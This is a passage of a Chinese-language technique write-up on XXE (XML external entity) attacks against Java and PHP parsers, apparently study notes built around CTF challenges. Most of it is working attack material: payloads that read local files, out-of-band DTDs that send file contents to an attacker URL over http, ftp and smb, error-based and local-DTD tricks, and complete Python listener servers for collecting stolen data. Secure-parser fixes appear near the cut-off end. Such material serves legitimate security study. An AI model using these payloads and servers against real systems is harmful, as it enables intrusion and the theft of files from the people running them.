throws ParserConfigurationException, IOException, SAXException &#123;        InputStream inputStream = new java.io.ByteArrayInputStream(xml.getBytes());        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();        DocumentBuilder builder = factory.newDocumentBuilder();        // 漏洞：未禁用外部实体        Document doc = builder.parse(inputStream);        // 遍历xml节点name和value        StringBuffer buf = new StringBuffer();        NodeList rootNodeList = doc.getChildNodes();        for (int i = 0; i &lt; rootNodeList.getLength(); i++) &#123;            Node rootNode = rootNodeList.item(i);            NodeList child = rootNode.getChildNodes();            for (int j = 0; j &lt; child.getLength(); j++) &#123;                Node node = child.item(j);                buf.append(node.getNodeName() + &quot;: &quot; + node.getTextContent() + &quot;\\n&quot;);            &#125;        &#125;        System.out.println(buf.toString());//        System.out.println(doc);        System.out.println(&quot;Document parsed successfully&quot;);    &#125;\n\n传入刚刚的payload，成功读取到内容：\n\n各种语言支持的协议上面通过file协议引用外部文件，xml的dtd(document type definition)中还支持很多其他伪协议，具体怎么用在下面讲。\nPHP：file&#x2F;http&#x2F;ftp&#x2F;php&#x2F;compress.zlib&#x2F;compress.bzip2&#x2F;data&#x2F;glob&#x2F;pharPHP扩展openssl：https&#x2F;ftpsPHP扩展zip：zipPHP扩展ssh2：ssh2.shell&#x2F;ssh2.exec&#x2F;ssh2.tunnel&#x2F;ssh2.sftp&#x2F;ssh2.scpPHP扩展rar：rarPHP扩展oggvorbis：oggPHP扩展expect ：expectJava：http&#x2F;https&#x2F;ftp&#x2F;file&#x2F;jar&#x2F;netdoc&#x2F;mailto&#x2F;gopher(仅限低版本).NET：file&#x2F;http&#x2F;https&#x2F;ftp\n各种打法踩坑注意，前面不能有任何字符，换行也不行，不然就会报错：\n\n复制的时候注意点\n有回显一般用：\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[        &lt;!ENTITY read SYSTEM &quot;file:///D:/flag.txt&quot;&gt;        ]&gt;&lt;data&gt;    &lt;a&gt;&amp;read;&lt;/a&gt;&lt;/data&gt;\n\n跟上面讲的一样。\n读目录就把最后的文件名去掉\n特殊符号但是要注意，有一些特殊字符不能回显。\n在xml主体部分中 !%&gt;;可以正常回显：\n\n&amp;&lt;不能回显：\n\n除非是正确的xml语法，比如aaa，这样虽然不报错，但是只能回显标签内部的内容：\n\n通过上面的例子，可以发现其本质就是是否符合xml语法。\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[        &lt;!ENTITY read SYSTEM &quot;file:///D:/flag.txt&quot;&gt;        ]&gt;&lt;data&gt;    &lt;a&gt;&amp;read;&lt;/a&gt;&lt;/data&gt;\n\n通用实体在DTD部分声明，在XML文档主体中被按顺序解析，每次解析完都会检查一遍语法。这就是为什么不能出现单个&lt;的原因。\n但是在php中，可以通过php:&#x2F;&#x2F;filter的方式对文件进行编码，然后带出：\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE test[        &lt;!ENTITY read SYSTEM &quot;php://filter/convert.base64-encode/resource=flag.txt&quot;&gt;        ]&gt;&lt;data&gt;    &lt;a&gt;&amp;read;&lt;/a&gt;&lt;/data&gt;\n\nCDATA带出特殊符号CDATA能够将包裹的内容作为纯文本，不被xml解析器解析。如下：\n&lt;example&gt;  &lt;![CDATA[&lt;b&gt;This is a bold text&lt;/b&gt;]]&gt;&lt;/example&gt;\n\n失败1下面是一个失败的payload：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY start &quot;&lt;![CDATA[&quot;&gt;   &lt;!ENTITY goodies SYSTEM &quot;file:///D:/target.txt&quot;&gt;  &lt;!ENTITY end &quot;]]&gt;&quot;&gt;  ]&gt; &lt;user&gt;&lt;username&gt;&amp;start;&amp;goodies;&amp;end;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;\n\n会报错：\n\n看起来明明没问题，为什么会报错？\n这是因为通用实体的展开和xml主体的语法检查是交替进行的。也就是说，这里会先展开&start; 于是xml主体变成：\n&lt;user&gt;&lt;username&gt;&lt;![CDATA[&amp;goodies;&amp;end;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;\n\n这时，xml进行一次语法检查，发现&lt;&gt;没有闭合，于是抛出报错。\n下面是AI问答的关键部分：\n\n所以我们得想办法在DTD中就把CDATA完整拼接好。\n失败2下面又是一个失败的payload：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   &lt;!ENTITY % goodies SYSTEM &quot;file:///D:/target.txt&quot;&gt;  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY cdata &quot;%start;%goodies;%end;&quot;&gt;]&gt; &lt;user&gt;&lt;username&gt;&amp;cdata;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;\n\n报错：\n\n这里规定，通用实体和参数实体的定义中，都不能对参数实体进行引用。\n但是，外部dtd中的情况就不同：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % remote SYSTEM &quot;http://127.0.0.1:7777/evil.dtd&quot;&gt;%remote;]&gt; &lt;user&gt;&lt;username&gt;&amp;cdata;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY % goodies SYSTEM &quot;file:///D:/target.txt&quot;&gt;  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY cdata &quot;%start;%goodies;%end;&quot;&gt;\n\n外部dtd是允许在实体定义中引用另一个实体的，且在引用前会进行展开。\n通过CDATA，我们得以显示&lt;，但是单独的&amp;还是会报错：\n\n这是因为外部dtd中，使用file进行了一次dtd引用。解析器肯定是把引用的文件当作xml去进行语法检查，所以必须以&a; 的形式出现才行，而不能是单独的&amp;。实际上，任何实体中都不能出现单独的&amp;：\n\n在这里添加&amp;也会导致直接报错，外部dtd也是：\n\n但我们可以通过手动闭合的方式实现。比如target.txt的内容是&amp;，那外部dtd可以写成：\n&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY % goodies SYSTEM &quot;file:///D:/target.txt&quot;&gt;&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY cdata &quot;%start;%goodies;any;%end;&quot;&gt;\n\n\n这样就能成功读取。\n无回显（需外带）一般打法（http）php里很简单，直接编码外带就行\n&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE roottag [ &lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1/evil.dtd&quot;&gt; %dtd;]&gt;&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://攻击机URL/?file=%file;&#x27;&gt;&quot;&gt;%int;%send;\n\n&#37;是%的html编码\n失败1java里的外带情况会复杂些，主要是因为url里会出现特殊字符。\n首先看一个失败的payload：\n&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE roottag [ &lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1/evil.dtd&quot;&gt; %dtd; ]&gt;&lt;!ENTITY % file SYSTEM &quot;file:///D:/target.txt&quot;&gt;&lt;!ENTITY % send SYSTEM &#x27;http://攻击机URL/?file=%file;&#x27;&gt;%send;\n\n\n%file直接被原样带出了，并没有进行替换\n这是因为这个dtd中，%file位于%send的实体内容位置，所以会被作为字符串处理。\n那上面提到过\n&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY % goodies SYSTEM &quot;file:///D:/target.txt&quot;&gt;  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY cdata &quot;%start;%goodies;%end;&quot;&gt;\n\n%start;%goodies;%end;不也是出现在实体内容位置吗，为什么能够被展开。这是因为只有SYSTEM后面的实体内容才会被当作字符串。你想，SYSTEM后面原本就是用来调用外部dtd的，一般都是http://xxx，file://xxx，肯定当作字符串解析。\n&lt;!ENTITY % file SYSTEM &quot;file:///D:/target.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://攻击机URL/?file=%file;&#x27;&gt;&quot;&gt;%int;%send;\n\n而这样写，在展开int时，识别到里面是dtd格式，于是会开启dtd解析，这时候，%file就会被识别为参数实体，从而成功展开。\n特殊符号经过测试，发现http外带过程中，%，&amp;和\\n（即文件有换行就无法带出）无法正常带出，其他应该可以。其中%，&amp;如果出现在文件末尾，可以闭合。\ndtd还是这个：\n&lt;!ENTITY % file SYSTEM &quot;file:///D:/target.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://攻击机URL/?file=%file;&#x27;&gt;&quot;&gt;%int;%send;\n\n为什么%和&amp;不行，而&lt;可以，我还不是特别理解，下面是目前的解释：\n1、展开%int后，进入dtd解析状态，将%send里面的%file展开后，如果还是有%，&amp;等字符，则又会触发实体解析，从而报错\n2、而&lt;&gt;!在SYSTEM中被认为是普通字符\n那能不能通过CDATA外带特殊符号呢?\n&lt;!ENTITY % file SYSTEM &quot;file:///D:/target.txt&quot;&gt;&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY % all &quot;%start;%file;%end;&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://攻击机URL/?file=%all;&#x27;&gt;&quot;&gt;%int;%send;\n\n显然不行，因为刚刚讲了，在dtd解析的上下文环境中，&lt;!&gt;;这些在SYSTEM里根本不解析，但%一定会解析，所以还是相同的报错。\n那为什么http不能带出有换行的文件呢？这是由jdk代码决定的。\n8u65中的报错位置：\n\n各版本的报错代码不一样，不过都是不允许换行符。\nftp打法（&lt;7u131 &lt;8u131-b09）ftp在jdk低版本下可以外带多行数据，常用于读目录。\n各版本ftp能否使用：\n\nxml：\n&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE roottag [&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1:9999/evil.dtd&quot;&gt; %dtd;]&gt;\n\ndtd:\n&lt;!ENTITY % file SYSTEM &quot;file:///D:/&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;ftp://127.0.0.1:7777/%file;&#x27;&gt;&quot;&gt;%int;%send;\n\nevilFTP.py用的heihu师傅的，python evilFTP.py 7777 result.txt\nfrom socket import *from multiprocessing import Processimport timeimport sysIP = &#x27;127.0.0.1&#x27;PORT = int(sys.argv[1])ADDR_MAIN = (IP, PORT)ADDR_EXT = (IP, 63568)def get_host_ip():    try:        s = socket(AF_INET, SOCK_DGRAM)        s.connect((&#x27;8.8.8.8&#x27;, 80))        ip = s.getsockname()[0]    finally:        s.close()    return ipdef epsv(s_ext):    s_ext.bind(ADDR_EXT)    s_ext.listen()    time.sleep(0.5)    s_ext.close()    return 0def clear_null(res):    new = []    for i in res:        if i != &#x27;&#x27;:            # wait for 2th channel            new.append(i)    return newdef center(connect):    res = []    connect.send(b&quot;220 (vsFTPd 3.0.3)\\n&quot;)    print(&#x27;[*]Waiting for data...&#x27;)    print(&quot;-&quot; * 30)    while True:        msg = connect.recv(1024)        print(&quot;-&gt;&quot;, end=&quot;&quot;)        print(msg)        data = &#x27;&#x27;        rep = b&#x27;\\n&#x27;        if &#x27;USER &#x27; == msg.decode()[:5]:            data = msg.decode() + &#x27;\\r\\n&#x27;            rep = b&#x27;331 Please specify the password.\\n&#x27;        elif &#x27;PASS &#x27; == msg.decode()[:5]:            rep = b&#x27;230 Login successful.\\n&#x27;            # version = msg.decode()[5:].replace(&#x27;@&#x27;,&#x27;&#x27;)            data = msg.decode() + &#x27;\\r\\n\\r\\n\\r\\n&#x27;        # print(f&#x27;[*] The version is &#123;version&#125;&#x27;)        elif &#x27;TYPE I&#x27; == msg.decode()[:6]:            rep = b&#x27;200 Switching to Binary mode.\\n&#x27;        elif &#x27;TYPE A&#x27; == msg.decode()[:6]:            rep = b&#x27;200 Switching to ASCII mode.\\n&#x27;        elif &#x27;CWD &#x27; == msg.decode()[:4]:            data = msg.decode()[4:]            rep = b&#x27;250 Directory successfully changed.\\n&#x27;        elif &#x27;EPSV ALL&#x27; == msg.decode()[:8]:            rep = b&#x27;200 EPSV ALL ok.\\n&#x27;        elif &#x27;EPSV&#x27; == msg.decode()[:4]:            s_ext = socket()            p_ext = Process(target=epsv, args=(s_ext,))            p_ext.start()            rep = b&#x27;229 Entering Extended Passive Mode (|||63568|)\\n&#x27;            time.sleep(0.5)  # wait for 2th channel        elif &#x27;RETR &#x27; == msg.decode()[:5]:            data = msg.decode()[5:]        res.append(data[:-2])        print(&quot;&lt;-&quot;, end=&quot;&quot;)        print(rep)        connect.send(rep)        if &#x27;RETR &#x27; == msg.decode()[:5]:            time.sleep(1)  # wait for 2th channel            p_ext.close()            return &#x27;/&#x27;.join(clear_null(res))if __name__ == &#x27;__main__&#x27;:    print(f&#x27;[*]Listening &#123;IP&#125; on &#123;PORT&#125; and 63568...&#x27;)    output = sys.argv[2]    s = socket()    s.bind(ADDR_MAIN)    s.listen()    connect, addr = s.accept()    print(f&#x27;[*]Get connection from &#123;addr&#125;.&#x27;)    data = None    try:        data = center(connect)        print(&quot;-&quot; * 30)    except:        print(&#x27;[-]Failed to get data.&#x27;)    finally:        s.close()    with open(output, &#x27;w+&#x27;) as f:        if data == None:            print(&#x27;[*] ReadFile fail!!!&#x27;)        else:            f.write(data)            print(f&#x27;[ ]Data has been written into &#123;output&#125;.&#x27;)\n\n特殊字符相关：\n\n参考\nhttps://zoiltin.github.io/posts/%E7%9B%B2xxe%E4%B8%ADftp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/\n高版本jdk修复\n\n报错XXEphp中，允许参数实体内引用%\n&lt;!ENTITY % NUMBER &#x27;  &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;  &lt;!-- 定义file实体读取win.ini --&gt;  &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval;  &lt;!-- 展开eval实体 --&gt; &amp;#x25;error; &lt;!-- 触发error实体 --&gt; &#x27;&gt; %NUMBER; &lt;!-- 执⾏嵌套实体 --&gt;\n\n\n\njava得改一下\n一般打法（出网）&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE a [ &lt;!ENTITY % test SYSTEM &quot;http://IP:PORT/evil.xml&quot;&gt; %test; ]&gt;\n\ndtd:\n&lt;!ENTITY % file SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;%eval;%error;\n\n特殊符号这里跟前面无回显的情况是一样的，&lt;!;&gt;能直接带出来，%，&amp;不行。\n同样，没有用。\n不出网打法原来是利用windows或linux原本的dtd文件，然后对里面的参数实体进行覆盖。\nwindows存在 C:\\Windows\\System32\\wbem\\xml\\cim20.dtd  \n\n这里SuperClass可用，其他的在第一次被引用时，都不位于最后，无法进行闭合，如ArraySize：\n\n&lt;?xml version=&quot;1.0&quot; ?&gt; &lt;!DOCTYPE message [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd&quot;&gt; &lt;!ENTITY % SuperClass &#x27;&gt; &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt; &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt; &amp;#x25;eval; &amp;#x25;error; &lt;!ENTITY test &quot;test&quot;&#x27;&gt; %local_dtd; ]&gt;\n\n这里&#x26;#x25;先解析成&#x25;，再解析成%\nWindows上常用dtdC:&#x2F;Windows&#x2F;System32&#x2F;wbem&#x2F;xml&#x2F;cim20.dtdC:&#x2F;Windows&#x2F;System32&#x2F;wbem&#x2F;xml&#x2F;wmi20.dtdC:&#x2F;Windows&#x2F;SysWOW64&#x2F;wbem&#x2F;xml&#x2F;cim20.dtdC:&#x2F;Windows&#x2F;SysWOW64&#x2F;wbem&#x2F;xml&#x2F;wmi20.dtd\nlinux系统中dtd文件视系统而定，比如Ubuntu中&#x2F;usr&#x2F;share&#x2F;xml&#x2F;fontconfig&#x2F;fonts.dtdconstant可利用。\n&lt;!ENTITY % constant &#x27;int|double|string|matrix|bool|charset|langset|const&#x27;&gt;&lt;!ELEMENT patelt (%constant;)*&gt;\n\n参考\nhttps://mp.weixin.qq.com/s/XwmsNWMwFIKUQUV6B9KAFw\nsmb协议外带多行参考https://mp.weixin.qq.com/s/kUlXxJxKO-70QMNCQvLHZA\n基于这道题讲。\n首先尝试http外带，先不读取任何文件，就尝试发送http请求，能够确定目标jdk为8u202 这样依赖，ftp外带多行的方法用不了。接着试一下读取&#x2F;etc&#x2F;passwd。这里只能用ftp协议尝试。如果用http的话，由于passwd是多行文件，根本收不到http请求。用ftp的话，才能确定文件是否存在。虽然ftp在高版本jdk也没法读文件，但是文件存在的话，至少能收到请求，所以可以借此判断文件是否存在。\n读&#x2F;etc&#x2F;passwd，发现ftp服务器没收到任何东西，说明不存在此文件，那么就应该是windows系统。\n至此我们题目转变为windows环境下JDK高版本如何通过OOB获取多行内容。\n下面直接给出答案，思考过程看公众号。\n恶意xml：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE data [&lt;!ENTITY % dtd SYSTEM &quot;http://127.0.0.1:7777/evil.dtd&quot;&gt;%dtd;]&gt;\n\ndtd：\n&lt;!ENTITY % f SYSTEM &quot;netdoc://C:/&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &#x27;file://\\\\\\\\ip/?x=test%f;&#x27;&gt;&quot;&gt;%all;%send;\n\n这里读取文件时，开头第一个字符不能为分号，所以要自己加其他字符。\n安装smb服务：\n安装sambaapt install samba修改配置文件/etc/samba/smb.conf[global]guest account = nobodymap to guest = Bad Userserver role = standalone server[tmp]path = /tmpguest ok = yesbrowseable = yespublic = yes重启service smbd restart\n\n抓包smb流量：\ntcpdump -i eth0 port 445 -w smb_445.pcap\n\n\n\nhttps://github.com/cwkiller/xxe-smb-server\n或者使用脚本一步到位，能够启动http和smb服务：\n#!/usr/bin/env python3from impacket.smbserver import SimpleSMBServerfrom http.server import HTTPServer, BaseHTTPRequestHandlerimport sysimport osimport loggingimport threadingimport argparseclass XXEHandler(BaseHTTPRequestHandler):        public_ip = None        def do_GET(self):        &quot;&quot;&quot;处理所有 GET 请求&quot;&quot;&quot;        self.send_response(200)        self.send_header(&#x27;Content-type&#x27;, &#x27;application/xml&#x27;)        self.end_headers()                # 构造 XXE payload        payload = f&#x27;&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM \\&#x27;file:////&#123;self.public_ip&#125;/a%file;\\&#x27;&gt;&quot;&gt;\\n%all;&#x27;                self.wfile.write(payload.encode())                # 记录请求        logging.info(f&quot;[HTTP] Request from &#123;self.address_string()&#125; - Path: &#123;self.path&#125;&quot;)        logging.info(f&quot;[HTTP] Sent payload: &#123;payload&#125;&quot;)            def log_message(self, format, *args):        &quot;&quot;&quot;自定义日志格式&quot;&quot;&quot;        logging.info(f&quot;[HTTP] &#123;self.address_string()&#125; - &#123;format % args&#125;&quot;)def start_http_server(port, public_ip):    &quot;&quot;&quot;启动 HTTP 服务器&quot;&quot;&quot;    XXEHandler.public_ip = public_ip    server = HTTPServer((&#x27;0.0.0.0&#x27;, port), XXEHandler)    logging.info(f&quot;[*] HTTP Server started on port &#123;port&#125;&quot;)    logging.info(f&quot;[*] XXE Payload URL: http://&#123;public_ip&#125;:&#123;port&#125;/xxe.dtd&quot;)    server.serve_forever()def start_smb_server(share_path):    &quot;&quot;&quot;启动 SMB 服务器&quot;&quot;&quot;    server = SimpleSMBServer(listenAddress=&#x27;0.0.0.0&#x27;, listenPort=445)    server.addShare(&#x27;SHARE&#x27;, share_path, &#x27;&#x27;)    server.setSMBChallenge(&#x27;&#x27;)    server.setSMB2Support(True)    server.start()def main():    # 解析命令行参数    parser = argparse.ArgumentParser(        description=&#x27;XXE SMB Server - Combined HTTP and SMB server for XXE exploitation&#x27;,        formatter_class=argparse.RawDescriptionHelpFormatter,        epilog=&#x27;&#x27;&#x27;        Examples:        %(prog)s 1.2.3.4              # 使用默认 HTTP 端口 80        %(prog)s 1.2.3.4 8080         # 使用自定义 HTTP 端口 8080        &#x27;&#x27;&#x27;)        parser.add_argument(&#x27;public_ip&#x27;,                         help=&#x27;公网 IP 地址 (必需)&#x27;)    parser.add_argument(&#x27;webport&#x27;,                         type=int,                         nargs=&#x27;?&#x27;,                         default=80,                        help=&#x27;HTTP 服务端口 (默认: 80)&#x27;)    parser.add_argument(&#x27;-s&#x27;, &#x27;--share-path&#x27;,                        default=&#x27;/tmp/share&#x27;,                        help=&#x27;SMB 共享目录路径 (默认: /tmp/share)&#x27;)        args = parser.parse_args()        # 验证 IP 地址格式（简单验证）    if not args.public_ip or args.public_ip.count(&#x27;.&#x27;) != 3:        parser.error(&quot;请提供有效的公网 IP 地址&quot;)        # 自动创建共享目录    os.makedirs(args.share_path, exist_ok=True)        # 配置详细日志输出    logging.basicConfig(        level=logging.DEBUG,        format=&#x27;%(asctime)s [%(levelname)s] %(message)s&#x27;,        datefmt=&#x27;%Y-%m-%d %H:%M:%S&#x27;    )        # 设置 impacket 相关模块的日志级别    logging.getLogger(&#x27;impacket.smbserver&#x27;).setLevel(logging.DEBUG)    payload = f&#x27;&#x27;&#x27;Usage:  1. 请发送如下XXE payload到目标服务器   &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  &lt;!DOCTYPE data [  &lt;!ENTITY % file SYSTEM &quot;file:///&quot;&gt;  &lt;!ENTITY % dtd SYSTEM &quot;http://&#123;args.public_ip&#125;:&#123;args.webport&#125;/data.dtd&quot;&gt; %dtd;  ]&gt;  &lt;data&gt;&amp;send;&lt;/data&gt;  2. SMB 服务器将捕获文件内容&#x27;&#x27;&#x27;    print(payload)        try:        # 在单独的线程中启动 HTTP 服务器        http_thread = threading.Thread(            target=start_http_server,             args=(args.webport, args.public_ip),            daemon=True        )        http_thread.start()                # 在主线程中启动 SMB 服务器        start_smb_server(args.share_path)            except KeyboardInterrupt:        print(&quot;\\n[*] Servers stopped&quot;)        sys.exit(0)    except PermissionError:        print(&quot;\\n[!] Error: Permission denied. Please run with sudo for port 445 and port 80&quot;)        sys.exit(1)    except Exception as e:        print(f&quot;\\n[!] Error: &#123;e&#125;&quot;)        sys.exit(1)if __name__ == &#x27;__main__&#x27;:    main()\n\n注意：win11不适用，因为不能请求匿名的smb服务；家庭宽带无法向445端口发送请求\n其他tricknetdoc代替filejava的netdoc对file协议进行了封装，可以用来代替file读文件。\n在sun.net.www.protocol.netdoc.Handler#openConnection打断点\n\n能够发现file:&#x2F;&#x2F;&#x2F;C:&#x2F;xxx 或是 netdoc:&#x2F;&#x2F;&#x2F;C:&#x2F;xxx 也可以\n编码绕过&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE ANY [  &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;x&gt;&amp;f;&lt;/x&gt;\n\nutf7编码\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-7&quot; ?&gt;+ADwAIQ-DOCTYPE ANY +AFs-  +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-+AF0APg-+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-\n\njar协议上传文件jar协议使用时，会上传临时文件到靶机，并且可以通过构造特殊http请求让临时文件多存在一会儿。\n首先，jar协议的格式为：jar:&#x2F;&#x2F;{本地或网络URI}&#x2F;{jar文件}!&#x2F;{jar中的文件}\n下面是一个上传jar的脚本，通过在30s后上传jar的最后一个字节，达到临时文件驻留的效果，因此，需要在原本的jar后添加一个脏字节，从而使原jar在一开始顺序上传\n参考https://mp.weixin.qq.com/s/bFQOFFbACv3buxQCgVFhUQ\nimport sysimport timeimport threadingimport socketserverfrom urllib.parse import quoteimport http.client as httpclisten_host = &#x27;localhost&#x27;listen_port = 9999jar_file = sys.argv[1]class JarRequestHandler(socketserver.BaseRequestHandler):    def handle(self):        http_req = b&#x27;&#x27;        print(&#x27;New connection:&#x27;, self.client_address)        while b&#x27;\\r\\n\\r\\n&#x27; not in http_req:            try:                http_req += self.request.recv(4096)                print(&#x27;Client req:\\r\\n&#x27;, http_req.decode())                jf = open(jar_file, &#x27;rb&#x27;)                contents = jf.read()                headers = (&#x27;&#x27;&#x27;HTTP/1.0 200 OK\\r\\n&#x27;&#x27;&#x27;                           &#x27;&#x27;&#x27;Content-Type: application/java-archive\\r\\n\\r\\n&#x27;&#x27;&#x27;)                self.request.sendall(headers.encode(&#x27;ascii&#x27;))                self.request.sendall(contents[:-1])                time.sleep(30)                print(30)                self.request.sendall(contents[-1:])            except Exception as e:                print(&quot;get error at:&quot; + str(e))if __name__ == &#x27;__main__&#x27;:    jarserver = socketserver.TCPServer((listen_host, listen_port), JarRequestHandler)    print(&#x27;waiting for connection, listening &#123;port&#125;...&#x27;.format(port=listen_port))    server_thread = threading.Thread(target=jarserver.serve_forever)    server_thread.daemon = True    server_thread.start()    server_thread.join()\n\npython jarServer.py [端口] [添加脏字节后的jar包]\n会在 C:\\Users[user]\\AppData\\Local\\Temp  下产生临时文件：\n\n格式为jar_cachexxxx.tmp\n得到临时文件目录1、通过报错\n随便写一个jar内不存在的文件即可：\n\n但是只能确定目录，不能确定文件名，因为报错的时候，原临时文件已经被删除了\n2、通过ftp协议\n这个就是无回显里的ftp打法，通过列目录来获得临时文件的名称。先上传临时jar，然后ftp读目录。\n临时文件生成源码这里jdk8u65\n从报错列目录那里跟进：\n\n一点点调试，如果看到文件名产生了，说明走过头了，下面是调用栈：\n\n\n\n上面两张图产生前缀和后缀\n最终在java.nio.file.TempFileHelper#generatePath生成完整文件名：\n\n生成和删除临时文件的点：\n\n各个库中的XXE参考https://blog.spoock.com/2018/10/23/java-xxe/\nhttps://github.com/JoyChou93/java-sec-code 这个靶场的xxe涵盖大部分\nDocumentBuilderFactory【可回显】漏洞\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();DocumentBuilder builder = dbf.newDocumentBuilder();String FEATURE = null;FEATURE = &quot;http://javax.xml.XMLConstants/feature/secure-processing&quot;;dbf.setFeature(FEATURE, true);FEATURE = &quot;http://apache.org/xml/features/disallow-doctype-decl&quot;;dbf.setFeature(FEATURE, true);FEATURE = &quot;http://xml.org/sax/features/external-parameter-entities&quot;;dbf.setFeature(FEATURE, false);FEATURE = &quot;http://xml.org/sax/features/external-general-entities&quot;;dbf.setFeature(FEATURE, false);FEATURE = &quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;;dbf.setFeature(FEATURE, false);dbf.setXIncludeAware(false);dbf.setExpandEntityReferences(false);// 读取xml文件内容FileInputStream fis = new FileInputStream(&quot;path/to/xxexml&quot;);InputSource is = new InputSource(fis);builder.parse(is);\n\n正确修复\nDocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();String FEATURE = null;FEATURE = &quot;http://javax.xml.XMLConstants/feature/secure-processing&quot;;dbf.setFeature(FEATURE, true);FEATURE = &quot;http://apache.org/xml/features/disallow-doctype-decl&quot;;dbf.setFeature(FEATURE, true);FEATURE = &quot;http://xml.org/sax/features/external-parameter-entities&quot;;dbf.setFeature(FEATURE, false);FEATURE = &quot;http://xml.org/sax/features/external-general-entities&quot;;dbf.setFeature(FEATURE, false);FEATURE = &quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;;dbf.setFeature(FEATURE, false);dbf.setXIncludeAware(false);dbf.setExpandEntityReferences(false);DocumentBuilder builder = dbf.newDocumentBuilder();// 读取xml文件内容FileInputStream fis = new FileInputStream(&quot;path/to/xxexml&quot;);InputSource is = new InputSource(fis);Document doc = builder.parse(is);\n\njdom2【可回显】&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.jdom&lt;/groupId&gt; &lt;artifactId&gt;jdom2&lt;/artifactId&gt; &lt;version&gt;2.0.6.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;\n\n漏洞：\nSAXBuilder builder = new SAXBuilder();Document doc = builder.build(InputSource);\n\n修复1：\nSAXBuilder builder = new SAXBuilder(true);Document doc = builder.build(InputSource);\n\n修复2：\nSAXBuilder builder = new SAXBuilder();builder.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true);builder.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false);builder.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false);builder.setFeature(&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;, false);Document doc = builder.build(InputSource);\n\nSAXParserFactory[外带]漏洞：\nSAXParserFactory spf = SAXParserFactory.newInstance();SAXParser parser = 